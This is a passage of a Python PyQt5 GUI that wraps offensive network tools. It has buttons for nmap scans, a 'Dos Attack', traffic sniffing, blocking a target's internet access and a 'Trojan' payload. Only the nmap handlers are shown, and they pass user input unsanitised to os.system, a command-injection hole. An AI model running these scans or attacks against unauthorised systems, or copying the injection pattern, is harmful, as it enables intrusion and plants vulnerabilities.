#!/usr/bin/env python
# -*- coding: utf-8 -*-
from PyQt5 import QtCore, QtGui, QtWidgets 
import sys
import os
import time
from PyQt5.QtGui import *
from PyQt5.QtCore import *
from PyQt5.QtWidgets import *


class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(1600, 730)
        MainWindow.setMaximumSize(1600,730)
        MainWindow.setMinimumSize(1600,730)
        MainWindow.setGeometry(200,200,1600,730)
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
##################################----------LABELS--------##################################
        self.label_wallpaper = QtWidgets.QLabel(self.centralwidget)
        self.label_wallpaper.setGeometry(QtCore.QRect(0, 0, 1611, 681))
        self.label_wallpaper.setText("")
        self.label_wallpaper.setPixmap(QtGui.QPixmap("wallpaper.jpg"))
        self.label_wallpaper.setObjectName("label_wallpaper")

        self.label_site = QtWidgets.QLabel(self.centralwidget)
        self.label_site.setGeometry(QtCore.QRect(25, 22, 71, 31))
        self.label_site.setObjectName("label_site")
        self.label_site.setStyleSheet("color : white;""border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.label_port = QtWidgets.QLabel(self.centralwidget)
        self.label_port.setGeometry(QtCore.QRect(330, 21, 61, 31))
        self.label_port.setObjectName("label_port")
        self.label_port.setStyleSheet("color : white;""border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.label_nmap = QtWidgets.QLabel(self.centralwidget)
        self.label_nmap.setGeometry(QtCore.QRect(145, 60, 71, 31))
        self.label_nmap.setObjectName("label_nmap")
        self.label_nmap.setStyleSheet("color : white;""border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.label_tools = QtWidgets.QLabel(self.centralwidget)
        self.label_tools.setGeometry(QtCore.QRect(145, 300, 71, 31))
        self.label_tools.setObjectName("label_tools")
        self.label_tools.setStyleSheet("color : white;""border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.label_result = QtWidgets.QLabel(self.centralwidget)
        self.label_result.setGeometry(QtCore.QRect(600, 35, 80, 35))
        self.label_result.setObjectName("label_result")
        self.label_result.setStyleSheet("color : black;""border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.label_router_ip_address = QtWidgets.QLabel(self.centralwidget)
        self.label_router_ip_address.setGeometry(QtCore.QRect(940, 131, 140, 31))
        self.label_router_ip_address.setObjectName("label_router_ip_address")
        self.label_router_ip_address.setStyleSheet("color : black;""border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.label_target_ip_address = QtWidgets.QLabel(self.centralwidget)
        self.label_target_ip_address.setGeometry(QtCore.QRect(940, 170, 140, 31))
        self.label_target_ip_address.setObjectName("label_target_ip_address")
        self.label_target_ip_address.setStyleSheet("color : black;""border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.label_macchanger = QtWidgets.QLabel(self.centralwidget)
        self.label_macchanger.setGeometry(QtCore.QRect(950, 290, 100, 31))
        self.label_macchanger.setObjectName("label_macchanger")
        self.label_macchanger.setStyleSheet("color : black;""border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.label_local_network_scan = QtWidgets.QLabel(self.centralwidget)
        self.label_local_network_scan.setGeometry(QtCore.QRect(940, 80, 140, 31))
        self.label_local_network_scan.setObjectName("label_local_network_scan")
        self.label_local_network_scan.setStyleSheet("color : black;""border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.label_payload = QtWidgets.QLabel(self.centralwidget)
        self.label_payload.setGeometry(QtCore.QRect(950, 330, 100, 31))
        self.label_payload.setObjectName("label_payload")
        self.label_payload.setStyleSheet("color : black;""border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")
##################################----------LABELS--------##################################
##################################----------Line Edits--------##################################
        self.lineEdit_router_ip_address = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit_router_ip_address.setGeometry(QtCore.QRect(1090, 130, 131, 33))
        self.lineEdit_router_ip_address.setObjectName("lineEdit_router_ip_address")
        self.lineEdit_router_ip_address.setPlaceholderText(" Router IP ")
        self.lineEdit_router_ip_address.setStyleSheet("border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.lineEdit_target_ip_address = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit_target_ip_address.setGeometry(QtCore.QRect(1090, 170, 131, 33))
        self.lineEdit_target_ip_address.setObjectName("lineEdit_target_ip_address")
        self.lineEdit_target_ip_address.setPlaceholderText(" Target IP ")
        self.lineEdit_target_ip_address.setStyleSheet("border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.lineEdit_site = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit_site.setGeometry(QtCore.QRect(100, 20, 221, 33))
        self.lineEdit_site.setObjectName("lineEdit_site")
        self.lineEdit_site.setPlaceholderText(" www.example.com ")
        self.lineEdit_site.setStyleSheet("border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.plainTextEdit_result = QtWidgets.QPlainTextEdit(self.centralwidget)
        self.plainTextEdit_result.setGeometry(QtCore.QRect(360, 70, 551, 581))
        self.plainTextEdit_result.setObjectName("plainTextEdit_result")
        self.plainTextEdit_result.setStyleSheet("border-radius:15px;""font:bold 14px;""border-style:outset;""border-width:5px;""border-color:red;")

        self.lineEdit_port = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit_port.setGeometry(QtCore.QRect(395, 20, 100, 33))
        self.lineEdit_port.setObjectName("lineEdit_port")
        self.lineEdit_port.setPlaceholderText(" 22,80,23 ")
        self.lineEdit_port.setStyleSheet("border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")
##################################----------Line Edits--------##################################
##################################----------Buttons--------##################################
        self.pushButton_nmap_1 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_1.setGeometry(QtCore.QRect(30, 90, 96, 35))
        self.pushButton_nmap_1.setObjectName("pushButton_nmap_1")
        self.pushButton_nmap_1.clicked.connect(self.nmap_1)

        self.pushButton_nmap_2 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_2.setGeometry(QtCore.QRect(130, 90, 96, 35))
        self.pushButton_nmap_2.setObjectName("pushButton_nmap_2")
        self.pushButton_nmap_2.clicked.connect(self.nmap_2)

        self.pushButton_nmap_3 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_3.setGeometry(QtCore.QRect(230, 90, 96, 35))
        self.pushButton_nmap_3.setObjectName("pushButton_nmap_3")
        self.pushButton_nmap_3.clicked.connect(self.nmap_3)

        self.pushButton_nmap_4 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_4.setGeometry(QtCore.QRect(30, 130, 96, 35))
        self.pushButton_nmap_4.setObjectName("pushButton_nmap_4")
        self.pushButton_nmap_4.clicked.connect(self.nmap_4)

        self.pushButton_nmap_5 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_5.setGeometry(QtCore.QRect(130, 130, 96, 35))
        self.pushButton_nmap_5.setObjectName("pushButton_nmap_5")
        self.pushButton_nmap_5.clicked.connect(self.nmap_5)

        self.pushButton_nmap_6 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_6.setGeometry(QtCore.QRect(230, 130, 96, 35))
        self.pushButton_nmap_6.setObjectName("pushButton_nmap_6")
        self.pushButton_nmap_6.clicked.connect(self.nmap_6)

        self.pushButton_nmap_7 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_7.setGeometry(QtCore.QRect(30, 170, 96, 35))
        self.pushButton_nmap_7.setObjectName("pushButton_nmap_7")
        self.pushButton_nmap_7.clicked.connect(self.nmap_7)

        self.pushButton_nmap_8 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_8.setGeometry(QtCore.QRect(130, 170, 96, 35))
        self.pushButton_nmap_8.setObjectName("pushButton_nmap_8")
        self.pushButton_nmap_8.clicked.connect(self.nmap_8)

        self.pushButton_nmap_9 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_9.setGeometry(QtCore.QRect(230, 170, 96, 35))
        self.pushButton_nmap_9.setObjectName("pushButton_nmap_9")
        self.pushButton_nmap_9.clicked.connect(self.nmap_9)

        self.pushButton_nmap_10 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_10.setGeometry(QtCore.QRect(30, 210, 96, 35))
        self.pushButton_nmap_10.setObjectName("pushButton_nmap_10")
        self.pushButton_nmap_10.clicked.connect(self.nmap_10)

        self.pushButton_nmap_11 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_11.setGeometry(QtCore.QRect(130, 210, 96, 35))
        self.pushButton_nmap_11.setObjectName("pushButton_nmap_11")
        self.pushButton_nmap_11.clicked.connect(self.nmap_11)

        self.pushButton_nmap_12 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_12.setGeometry(QtCore.QRect(230, 210, 96, 35))
        self.pushButton_nmap_12.setObjectName("pushButton_nmap_12")
        self.pushButton_nmap_12.clicked.connect(self.nmap_12)

        self.pushButton_nmap_13 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_13.setGeometry(QtCore.QRect(30, 250, 96, 35))
        self.pushButton_nmap_13.setObjectName("pushButton_nmap_13")
        self.pushButton_nmap_13.clicked.connect(self.nmap_13)

        self.pushButton_nmap_14 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_14.setGeometry(QtCore.QRect(130, 250, 96, 35))
        self.pushButton_nmap_14.setObjectName("pushButton_nmap_14")
        self.pushButton_nmap_14.clicked.connect(self.nmap_14)

        self.pushButton_nmap_15 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_15.setGeometry(QtCore.QRect(230, 250, 96, 35))
        self.pushButton_nmap_15.setObjectName("pushButton_nmap_15")
        self.pushButton_nmap_15.clicked.connect(self.nmap_15)

        self.pushButton_tools_1 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_tools_1.setGeometry(QtCore.QRect(30, 330, 96, 35))
        self.pushButton_tools_1.setObjectName("pushButton_tools_1")
        self.pushButton_tools_1.clicked.connect(self.firewall_detection)

        self.pushButton_tools_2 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_tools_2.setGeometry(QtCore.QRect(130, 330, 96, 35))
        self.pushButton_tools_2.setObjectName("pushButton_tools_2")
        self.pushButton_tools_2.clicked.connect(self.dos_attack)

        self.pushButton_tools_3 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_tools_3.setGeometry(QtCore.QRect(230, 330, 96, 35))
        self.pushButton_tools_3.setObjectName("pushButton_tools_3")
        self.pushButton_tools_3.clicked.connect(self.subdomain)

        self.pushButton_tools_4 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_tools_4.setGeometry(QtCore.QRect(30, 370, 96, 35))
        self.pushButton_tools_4.setObjectName("pushButton_tools_4")
        self.pushButton_tools_4.clicked.connect(self.dmitryscan)

        self.pushButton_tools_5 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_tools_5.setGeometry(QtCore.QRect(130, 370, 96, 35))
        self.pushButton_tools_5.setObjectName("pushButton_tools_5")
        self.pushButton_tools_5.clicked.connect(self.dirb)

        self.pushButton_tools_6 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_tools_6.setGeometry(QtCore.QRect(230, 370, 96, 35))
        self.pushButton_tools_6.setObjectName("pushButton_tools_6")
        self.pushButton_tools_6.clicked.connect(self.nikto)

        self.pushButton_clear = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_clear.setGeometry(QtCore.QRect(690, 33, 96, 35))
        self.pushButton_clear.setObjectName("pushButton_clear")
        self.pushButton_clear.clicked.connect(self.clear)

        self.pushButton_sniff_image = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_sniff_image.setGeometry(QtCore.QRect(1370, 130, 131, 35))
        self.pushButton_sniff_image.setObjectName("pushButton_sniff_image")
        self.pushButton_sniff_image.clicked.connect(self.sniff_image)

        self.pushButton_sniff_url = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_sniff_url.setGeometry(QtCore.QRect(1230, 130, 131, 35))
        self.pushButton_sniff_url.setObjectName("pushButton_sniff_url")
        self.pushButton_sniff_url.clicked.connect(self.sniff_url)

        self.pushButton_block_net = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_block_net.setGeometry(QtCore.QRect(1230, 170, 131, 35))
        self.pushButton_block_net.setObjectName("pushButton_block_net")
        self.pushButton_block_net.clicked.connect(self.block_net)

        self.pushButton_free_net = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_free_net.setGeometry(QtCore.QRect(1370, 170, 131, 35))
        self.pushButton_free_net.setObjectName("pushButton_free_net")
        self.pushButton_free_net.clicked.connect(self.free_net)

        self.pushButton_netdiscover = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_netdiscover.setGeometry(QtCore.QRect(1090, 80, 131, 35))
        self.pushButton_netdiscover.setObjectName("pushButton_netdiscover")
        self.pushButton_netdiscover.clicked.connect(self.netdiscover)

        self.pushButton_local_scan = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_local_scan.setGeometry(QtCore.QRect(1230, 80, 131, 35))
        self.pushButton_local_scan.setObjectName("pushButton_local_scan")
        self.pushButton_local_scan.clicked.connect(self.network_scaner)

        self.pushButton_nmap_scan = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_scan.setGeometry(QtCore.QRect(1370, 80, 131, 35))
        self.pushButton_nmap_scan.setObjectName("pushButton_nmap_scan")
        self.pushButton_nmap_scan.clicked.connect(self.nmap_network_scanner)

        self.pushButton_macchanger_random = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_macchanger_random.setGeometry(QtCore.QRect(1060, 290, 131, 35))
        self.pushButton_macchanger_random.setObjectName("pushButton_macchanger_random")
        self.pushButton_macchanger_random.clicked.connect(self.macchanger_random)

        self.pushButton_macchanger_original = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_macchanger_original.setGeometry(QtCore.QRect(1200, 290, 131, 35))
        self.pushButton_macchanger_original.setObjectName("pushButton_macchanger_original")
        self.pushButton_macchanger_original.clicked.connect(self.macchanger_original)

        self.pushButton_payload = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_payload.setGeometry(QtCore.QRect(1060, 330, 131, 35))
        self.pushButton_payload.setObjectName("pushButton_payload")
        self.pushButton_payload.clicked.connect(self.payload)
##################################---------Buttons--------##################################
##################################---------Raise--------##################################
        self.label_wallpaper.raise_()
        self.lineEdit_site.raise_()
        self.label_port.raise_()
        self.label_site.raise_()
        self.pushButton_nmap_1.raise_()
        self.pushButton_nmap_2.raise_()
        self.pushButton_nmap_4.raise_()
        self.pushButton_nmap_5.raise_()
        self.pushButton_nmap_7.raise_()
        self.pushButton_nmap_8.raise_()
        self.pushButton_nmap_10.raise_()
        self.pushButton_nmap_11.raise_()
        self.pushButton_nmap_3.raise_()
        self.pushButton_nmap_6.raise_()
        self.pushButton_nmap_9.raise_()
        self.pushButton_nmap_12.raise_()
        self.label_nmap.raise_()
        self.pushButton_nmap_14.raise_()
        self.pushButton_nmap_15.raise_()
        self.pushButton_nmap_13.raise_()
        self.label_tools.raise_()
        self.pushButton_tools_2.raise_()
        self.pushButton_tools_1.raise_()
        self.pushButton_tools_3.raise_()
        self.pushButton_tools_5.raise_()
        self.pushButton_tools_4.raise_()
        self.lineEdit_port.raise_()
        self.pushButton_tools_6.raise_()
        self.plainTextEdit_result.raise_()
        self.label_result.raise_()
        self.pushButton_clear.raise_()
        self.label_router_ip_address.raise_()
        self.label_target_ip_address.raise_()
        self.lineEdit_router_ip_address.raise_()
        self.lineEdit_target_ip_address.raise_()
        self.pushButton_sniff_image.raise_()
        self.pushButton_block_net.raise_()
        self.pushButton_free_net.raise_()
        self.pushButton_sniff_url.raise_()
        self.label_macchanger.raise_()
        self.label_local_network_scan.raise_()
        self.pushButton_netdiscover.raise_()
        self.pushButton_local_scan.raise_()
        self.pushButton_nmap_scan.raise_()
        self.pushButton_macchanger_random.raise_()
        self.pushButton_macchanger_original.raise_()
        self.label_payload.raise_()
        self.pushButton_payload.raise_()
##################################---------Raise--------##################################
##################################---------Menubar--------##################################
        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QtWidgets.QMenuBar(MainWindow)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 1599, 31))
        self.menubar.setObjectName("menubar")
        self.menuHelp = QtWidgets.QMenu(self.menubar)
        self.menuHelp.setObjectName("menuHelp")
        MainWindow.setMenuBar(self.menubar)
        self.statusbar = QtWidgets.QStatusBar(MainWindow)
        self.statusbar.setObjectName("statusbar")
        MainWindow.setStatusBar(self.statusbar)
        self.actionInformation = QtWidgets.QAction(MainWindow)
        self.actionInformation.setObjectName("actionInformation")
        self.menuHelp.addAction(self.actionInformation)
        self.menubar.addAction(self.menuHelp.menuAction())
        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)
##################################---------Menubar--------##################################
##################################---------Functions--------##################################
    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "Riglsable"))
        self.pushButton_nmap_1.setText(_translate("MainWindow", "Standart Scan"))
        self.pushButton_nmap_2.setText(_translate("MainWindow", "SYN Scan"))
        self.pushButton_nmap_3.setText(_translate("MainWindow", "Open Ports"))
        self.pushButton_nmap_4.setText(_translate("MainWindow", "All Port Scan"))
        self.pushButton_nmap_5.setText(_translate("MainWindow", "Version Scan"))
        self.pushButton_nmap_6.setText(_translate("MainWindow", "OS info Scan"))
        self.pushButton_nmap_7.setText(_translate("MainWindow", "Fast Scan  "))
        self.pushButton_nmap_8.setText(_translate("MainWindow", "All Scan"))
        self.pushButton_nmap_9.setText(_translate("MainWindow", "DNS Parsing"))
        self.pushButton_nmap_10.setText(_translate("MainWindow", "IPV6 Scan"))
        self.pushButton_nmap_11.setText(_translate("MainWindow", "Ports Scan"))
        self.pushButton_nmap_12.setText(_translate("MainWindow", "Host Scan"))
        self.pushButton_nmap_13.setText(_translate("MainWindow", "Buton"))
        self.pushButton_nmap_14.setText(_translate("MainWindow", "Buton"))
        self.pushButton_nmap_15.setText(_translate("MainWindow", "Buton"))
        self.pushButton_tools_1.setText(_translate("MainWindow", "Firewall Scan"))
        self.pushButton_tools_2.setText(_translate("MainWindow", "Dos Attack"))
        self.pushButton_tools_3.setText(_translate("MainWindow", "Subdomains"))
        self.pushButton_tools_4.setText(_translate("MainWindow", "Dmitry Scan"))
        self.pushButton_tools_5.setText(_translate("MainWindow", "Dirb"))
        self.pushButton_tools_6.setText(_translate("MainWindow", "Nikto"))
        self.pushButton_clear.setText(_translate("MainWindow", "Clear"))
        self.pushButton_sniff_image.setText(_translate("MainWindow", "Sniff Image"))
        self.pushButton_block_net.setText(_translate("MainWindow", "Block from NET"))
        self.pushButton_free_net.setText(_translate("MainWindow", "Free from NET"))
        self.pushButton_sniff_url.setText(_translate("MainWindow", "Sniff URL"))
        self.pushButton_netdiscover.setText(_translate("MainWindow", "Netdiscover"))
        self.pushButton_local_scan.setText(_translate("MainWindow", "Local Scan"))
        self.pushButton_nmap_scan.setText(_translate("MainWindow", "Nmap Scan"))
        self.pushButton_macchanger_random.setText(_translate("MainWindow", "Random MAC"))
        self.pushButton_macchanger_original.setText(_translate("MainWindow", "Original MAC"))
        self.pushButton_payload.setText(_translate("MainWindow", "Trojan"))
        self.label_port.setText(_translate("MainWindow", "Ports:"))
        self.label_site.setText(_translate("MainWindow", "      Site:"))
        self.label_nmap.setText(_translate("MainWindow", "    Nmap"))
        self.label_tools.setText(_translate("MainWindow", "    Tools"))
        self.label_result.setText(_translate("MainWindow", "     Result"))
        self.label_router_ip_address.setText(_translate("MainWindow", "Router IP Address :"))
        self.label_target_ip_address.setText(_translate("MainWindow", "Target IP Address :"))
        self.label_macchanger.setText(_translate("MainWindow", "   Macchanger"))
        self.label_local_network_scan.setText(_translate("MainWindow", "Local Network Scan"))
        self.label_payload.setText(_translate("MainWindow", "        Payload"))
        self.menuHelp.setTitle(_translate("MainWindow", "Help"))
        self.actionInformation.setText(_translate("MainWindow", "Information"))
    def nmap_1(self):
        if self.lineEdit_site.text()=="":
            msg2 = QMessageBox()
            msg2.setWindowTitle("Information")
            msg2.setBaseSize(300,300)
            msg2.setIcon(QMessageBox.Warning)
            msg2.setText("Please enter the site adress or IP adress!")
            msg2.exec_()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.setStyleSheet("color:white;")
            self.plainTextEdit_result.insertPlainText("Standard scan is starting,please wait...")
            msg = QMessageBox()
            msg.setWindowTitle("Information")
            msg.setBaseSize(300,300)
            msg.setIcon(QMessageBox.Information)
            msg.setText("Standard scan is starting,please wait...")
            msg.exec_()
            os.system("nmap {} -oN output.txt".format(self.lineEdit_site.text()))
            file=open("output.txt","r")
            info=file.read()
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.insertPlainText(info)
            file.close()
            msg1 = QMessageBox()
            msg1.setWindowTitle("Information")
            msg1.setBaseSize(300,300)
            msg1.setIcon(QMessageBox.Information)
            msg1.setText("Scan completed successfully")
            msg1.exec_()
    def nmap_2(self):
        if self.lineEdit_site.text()=="":
            msg2 = QMessageBox()
            msg2.setWindowTitle("Information")
            msg2.setBaseSize(300,300)
            msg2.setIcon(QMessageBox.Warning)
            msg2.setText("Please enter the site adress or IP adress!")
            msg2.exec_()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.setStyleSheet("color:white;")
            self.plainTextEdit_result.insertPlainText("SYN scan is starting,please wait...")
            msg = QMessageBox()
            msg.setWindowTitle("Information")
            msg.setBaseSize(300,300)
            msg.setIcon(QMessageBox.Information)
            msg.setText("Standard scan is starting,please wait...")
            msg.exec_()
            os.system("nmap -sS {} -oN output.txt".format(self.lineEdit_site.text()))
            file=open("output.txt","r")
            info=file.read()
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.insertPlainText(info)
            file.close()
            msg1 = QMessageBox()
            msg1.setWindowTitle("Information")
            msg1.setBaseSize(300,300)
            msg1.setIcon(QMessageBox.Information)
            msg1.setText("SYN Scan completed successfully")
            msg1.exec_()
    def nmap_3(self):
        if self.lineEdit_site.text()=="":
            msg5 = QMessageBox()
            msg5.setWindowTitle("Information")
            msg5.setBaseSize(300,300)
            msg5.setIcon(QMessageBox.Warning)
            msg5.setText("Please enter the site adress or IP adress!")
            msg5.exec_()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.setStyleSheet("color:white;")
            self.plainTextEdit_result.insertPlainText("Open ports scan is starting,please wait...")
            msg = QMessageBox()
            msg.setWindowTitle("Information")
            msg.setBaseSize(300,300)
            msg.setIcon(QMessageBox.Information)
            msg.setText("Open ports scan is starting,please wait...")
            msg.exec_()
            os.system("nmap --open {} -oN output.txt".format(self.lineEdit_site.text()))
            file=open("output.txt","r")
            info=file.read()
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.insertPlainText(info)
            file.close()
            msg1 = QMessageBox()
            msg1.setWindowTitle("Information")
            msg1.setBaseSize(300,300)
            msg1.setIcon(QMessageBox.Information)
            msg1.setText("Open ports scan completed successfully")
            msg1.exec_()
    def nmap_4(self):
        if self.lineEdit_site.text()=="":
            msg5 = QMessageBox()
            msg5.setWindowTitle("Information")
            msg5.setBaseSize(300,300)
            msg5.setIcon(QMessageBox.Warning)
            msg5.setText("Please enter the site adress or IP adress!")
            msg5.exec_()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.setStyleSheet("color:white;")
            self.plainTextEdit_result.insertPlainText("All ports scan is starting,please wait...")
            msg = QMessageBox()
            msg.setWindowTitle("Information")
            msg.setBaseSize(300,300)
            msg.setIcon(QMessageBox.Information)
            msg.setText("All ports scan is starting,please wait...")
            msg.exec_()
            os.system("nmap -p- {} -oN output.txt".format(self.lineEdit_site.text()))
            file=open("output.txt","r")
            info=file.read()
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.insertPlainText(info)
            file.close()
            msg1 = QMessageBox()
            msg1.setWindowTitle("Information")
            msg1.setBaseSize(300,300)
            msg1.setIcon(QMessageBox.Information)
            msg1.setText("Scan completed successfully")
            msg1.exec_()
    def nmap_5(self):
        if self.lineEdit_site.text()=="":
            msg5 = QMessageBox()
            msg5.setWindowTitle("Information")
            msg5.setBaseSize(300,300)
            msg5.setIcon(QMessageBox.Warning)
            msg5.setText("Please enter the site adress or IP adress!")
            msg5.exec_()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.setStyleSheet("color:white;")
            self.plainTextEdit_result.insertPlainText("Port version scan is starting,please wait...")
            msg = QMessageBox()
            msg.setWindowTitle("Information")
            msg.setBaseSize(300,300)
            msg.setIcon(QMessageBox.Information)
            msg.setText("Port version scan is starting,please wait...")
            msg.exec_()
            os.system("nmap -sV -sC {} -oN output.txt".format(self.lineEdit_site.text()))
            file=open("output.txt","r")
            info=file.read()
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.insertPlainText(info)
            file.close()
            msg1 = QMessageBox()
            msg1.setWindowTitle("Information")
            msg1.setBaseSize(300,300)
            msg1.setIcon(QMessageBox.Information)
            msg1.setText("Scan completed successfully")
            msg1.exec_()
    def nmap_6(self):
        if self.lineEdit_site.text()=="":
            msg5 = QMessageBox()
            msg5.setWindowTitle("Information")
            msg5.setBaseSize(300,300)
            msg5.setIcon(QMessageBox.Warning)
            msg5.setText("Please enter the site adress or IP adress!")
            msg5.exec_()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.setStyleSheet("color:white;")
            self.plainTextEdit_result.insertPlainText("OS info scan is starting,please wait...")
            msg = QMessageBox()
            msg.setWindowTitle("Information")
            msg.setBaseSize(300,300)
            msg.setIcon(QMessageBox.Information)
            msg.setText("OS info scan is starting,please wait...")
            msg.exec_()
            os.system("nmap -O {} -oN output.txt".format(self.lineEdit_site.text()))
            file=open("output.txt","r")
            info=file.read()
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.insertPlainText(info)
            file.close()
            msg1 = QMessageBox()
            msg1.setWindowTitle("Information")
            msg1.setBaseSize(300,300)
            msg1.setIcon(QMessageBox.Information)
            msg1.setText("Scan completed successfully")
            msg1.exec_()
    def nmap_7(self):
        if self.lineEdit_site.text()=="":
            msg5 = QMessageBox()
            msg5.setWindowTitle("Information")
            msg5.setBaseSize(300,300)
            msg5.setIcon(QMessageBox.Warning)
            msg5.setText("Please enter the site adress or IP adress!")
            msg5.exec_()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.setStyleSheet("color:white;")
            self.plainTextEdit_result.insertPlainText("Fast scan is starting,please wait...")
            msg = QMessageBox()
            msg.setWindowTitle("Information")
            msg.setBaseSize(300,300)
            msg.setIcon(QMessageBox.Information)
            msg.setText("Fast scan is starting,please wait...")
            msg.exec_()
            os.system("nmap -F {} -oN output.txt".format(self.lineEdit_site.text()))
            file=open("output.txt","r")
            info=file.read()
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.insertPlainText(info)
            file.close()
            msg1 = QMessageBox()
            msg1.setWindowTitle("Information")
            msg1.setBaseSize(300,300)
            msg1.setIcon(QMessageBox.Information)
            msg1.setText("Scan completed successfully")
            msg1.exec_()
    def nmap_8(self):
        if self.lineEdit_site.text()=="":
            msg5 = QMessageBox()
            msg5.setWindowTitle("Information")
            msg5.setBaseSize(300,300)
            msg5.setIcon(QMessageBox.Warning)
            msg5.setText("Please enter the site adress or IP adress!")
            msg5.exec_()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.setStyleSheet("color:white;")
            self.plainTextEdit_result.insertPlainText("All scan is starting,please wait...")
            msg = QMessageBox()
            msg.setWindowTitle("Information")
            msg.setBaseSize(300,300)
            msg.setIcon(QMessageBox.Information)
            msg.setText("All scan is starting,please wait...")
            msg.exec_()
            os.system("nmap -sV -sC -A -O -sT -p- {} -oN output.txt".format(self.lineEdit_site.text()))
            file=open("output.txt","r")
            info=file.read()
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.insertPlainText(info)
            file.close()
            msg1 = QMessageBox()
            msg1.setWindowTitle("Information")
            msg1.setBaseSize(300,300)
            msg1.setIcon(QMessageBox.Information)
            msg1.setText("Scan completed successfully")
            msg1.exec_()
    def nmap_9(self):
        if self.lineEdit_site.text()=="":
            msg5 = QMessageBox()
            msg5.setWindowTitle("Information")
            msg5.setBaseSize(300,300)
            msg5.setIcon(QMessageBox.Warning)
            msg5.setText("Please enter the site adress or IP adress!")
            msg5.exec_()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.setStyleSheet("color:white;")
            self.plainTextEdit_result.insertPlainText("DNS parsing scan is starting,please wait...")
            msg = QMessageBox()
            msg.setWindowTitle("Information")
            msg.setBaseSize(300,300)
            msg.setIcon(QMessageBox.Information)
            msg.setText("DNS parsing scan is starting,please wait..")
            msg.exec_()
            os.system("nmap -Pn -n --system-dns {} -oN output.txt".format(self.lineEdit_site.text()))
            file=open("output.txt","r")
            info=file.read()
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.insertPlainText(info)
            file.close()
            msg1 = QMessageBox()
            msg1.setWindowTitle("Information")
            msg1.setBaseSize(300,300)
            msg1.setIcon(QMessageBox.Information)
            msg1.setText("Scan completed successfully")
